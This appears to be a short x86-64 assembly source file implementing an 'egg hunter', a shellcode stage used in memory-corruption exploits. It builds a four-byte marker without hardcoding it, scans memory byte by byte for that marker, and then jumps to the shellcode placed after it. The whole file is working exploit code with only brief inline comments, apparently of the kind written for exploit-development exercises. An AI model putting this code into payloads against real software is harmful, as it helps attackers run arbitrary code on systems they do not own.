global _start
_start:

	inc rdx               ; pop valid address into rdi
	push rdx
	pop rdi
	push 0x30313232       ; push the marker-1 into the stack
	pop rax
	inc eax               ; marker is now 0x30313233 so its not hardcoded
EggHunter:
	inc rdi		      ; increment rdi by one byte
	cmp eax,[rdi]         ; check for egg match
	jnz EggHunter         ; if not found jump to EggHunter label
	inc rdi               ; increment rdi pointer by 4
	inc rdi
	inc rdi
	inc rdi
	jmp rdi               ; jump to the shellcode
	
